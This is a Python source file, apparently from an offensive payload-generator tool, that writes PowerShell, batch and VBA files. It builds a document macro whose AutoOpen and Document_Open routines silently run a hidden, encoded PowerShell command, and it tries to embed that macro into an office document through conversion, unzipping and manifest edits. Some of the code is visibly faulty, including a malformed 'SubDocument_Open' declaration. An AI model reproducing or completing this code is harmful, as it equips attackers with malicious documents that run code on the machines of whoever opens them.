import random
import subprocess
from docx import Document

def file_creator(extra, extension, final_output):
    filename = ""
    for _ in range(5):
        filename += str(random.randint(1,9))
    
    # .ps1 FILE FOR windows (powershell).
    if extension == 'ps1':
        with open(f"{filename}.{extension}", "w") as f:
            f.write(f'Write-Host "{final_output}"\nGet-Process')

    # .bat(batch) FILE FOR windows.
    elif extension == 'bat':
        #TODO: Might need fixing...
        with open(f"{filename}.{extension}", "w") as f:
            f.write(f'''@echo off\npowershell -Command "Write-Host '{final_output}'"''')

    # .vba FILE FOR libreoffce, Word,...
    elif extension == 'vba':

        string = f"powershell.exe -nop -w hidden -e {final_output}"
        stripped_string = ""
        n = 50
        for i in range(0, len(string), n):
            stripped_string += "Str = Str + " + '"' + string[i:i+n] + '"\n\t'

        with open(f"{filename}.{extension}", "w") as f:
            f.write(f'''
Sub AutoOpen()
    MyMacro
End Sub

SubDocument_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    {stripped_string}
    CreateObject("Wscript.Shell").Run Str
End Sub
            ''')
    
    # .docx FILE FOR IMBEDDING .vba CONTENT.
    if (extra == 'docx' or extra == 'docm') and (extension == 'vba'):
        doc = Document()     
        doc.add_paragraph('Hello, this is a .docx file created with Linux!')
        doc.save(f'{filename}.docx')
    
        convert_file = [
            "libreoffice", "--headless", "--convert-to",
            "odt", f"{filename}.docx"
        ] 

        unzip_file = [
            "unzip", f"{filename}.odt", "-d", "temp_doc"
        ]

        modify_unpacked = [
            "mkdir", "temp_doc/Scripts"
        ]

        with open(f"{filename}.{extension}", "r") as f:
            macro = f.read()

        xml_format = f"""
<?xml version="1.0" encoding="UTF-8"?>
<library:library xmlns:library="http://openoffice.org/2000/library" library:name="Standard" library:readonly="false" library:passwordprotected="false">
    <library:element library:name="YourMacroName">
        <library:code><![CDATA[
            {macro}
        ]]></library:code>
    </library:element>
</library:library>
        """

        reference = '<manifest:file-entry manifest:full-path="Scripts/MyMacro.xml" manifest:media-type="application/vnd.sun.xml.script"/>'

        with open(f"MyMacro.xml", "w") as f:
            f.write(xml_format)

        move_macro = [
            "mv", "MyMacro.xml", "temp_doc/Scripts/"
        ]
        
        subprocess.run(convert_file, check=True)
        subprocess.run(unzip_file)

        with open(f"temp_doc/META-INF/manifest.xml", "a") as f:
            f.write(reference)

        subprocess.run(modify_unpacked)
        subprocess.run(move_macro)

        repackage_file = [
            "zip", "-r", f"m{filename}.odt", "temp_doc/*"
        ]

        subprocess.run(repackage_file)

    else:
        print("[-] You must specify '-e vba' in combination with '-x docx'")

        
